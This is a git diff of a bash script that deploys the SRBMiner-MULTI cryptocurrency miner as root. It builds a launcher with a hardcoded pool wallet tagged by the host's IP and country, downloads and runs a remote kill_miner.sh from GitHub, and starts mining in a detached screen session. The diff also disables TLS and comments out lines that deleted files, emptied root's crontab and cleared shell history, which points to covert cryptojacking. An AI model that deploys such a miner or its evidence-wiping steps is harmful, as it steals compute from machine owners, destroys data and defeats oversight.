@@ -38,29 +38,17 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 sudo ./kill_miner.sh
 sleep 5
-sudo ./SRBMiner-MULTI --background -t $cores -a ghostrider --pool $fastest_server:1090 --tls true --wallet knDjktTRpuRLmntgfgKFftM43W3pcaBn3k.$IP4_UNDERSCORE-$country --keepalive true
+sudo ./SRBMiner-MULTI --background -t $cores -a ghostrider --pool $fastest_server:1090 --tls false --wallet knDjktTRpuRLmntgfgKFftM43W3pcaBn3k.$IP4_UNDERSCORE-$country --keepalive true
 EOF
 
 chmod +x /root/danielluis1921.sh
-
-hostname=$(hostname)
-if [ "$hostname" = "vultr" ];
-then
-  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof SRBMiner-MULTI) > /dev/null 2>&1 &" danielluis1921.sh
-  sed -i 's/Linode/Vultr/g' danielluis1921.sh
-  sed -i 's/--keepalive true//g' danielluis1921.sh
-else
-  sed -i 's/stratum-asia/stratum-eu/g' danielluis1921.sh
-  sed -i 's/stratum-na/stratum-eu/g' danielluis1921.sh
-  echo "hostname isn't vultr"
-fi
 
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
 chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
-screen -dmS Keymaker ./danielluis1921.sh
-rm -fv *
-rm -fR *
-cat /dev/null > /var/spool/cron/crontabs/root
-history -c && history -w
+screen -dmS Keymaker bash danielluis1921.sh
+#rm -fv *
+#rm -fR *
+#cat /dev/null > /var/spool/cron/crontabs/root
+#history -c && history -w
